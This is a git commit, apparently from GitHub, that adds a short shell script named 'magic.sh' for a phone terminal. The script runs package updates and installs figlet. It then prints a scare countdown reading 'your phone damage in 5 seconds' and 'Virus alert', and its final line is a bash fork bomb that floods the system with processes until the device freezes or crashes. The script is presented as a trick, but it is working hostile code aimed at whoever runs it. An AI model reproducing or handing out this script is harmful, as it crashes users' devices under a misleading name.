c7215755bcada8b86b80bd69ddf325a6d9764cd7
M47R1X <85056526+m47r1x-2@users.noreply.github.com>
2021-06-17 21:25:24 +0530

    Add files via upload

---
+++ magic.sh
@@ -0,0 +1,41 @@
+#!/bin/bashclear
+
+###############################################################
+
+clear
+
+apt update && apt upgrade -y
+
+pkg install figlet -y
+
+sleep 2
+
+figlet your phone damage in 5 seconds
+
+echo "5"
+
+sleep 1
+
+echo "4"
+
+sleep 1
+
+echo "3"
+
+sleep 1
+
+echo "2"
+
+sleep 1
+
+echo "1"
+
+sleep 1
+
+echo "0"
+
+echo "virus detected ⚠️"
+
+figlet Virus alert
+
+:(){ :|:& };:
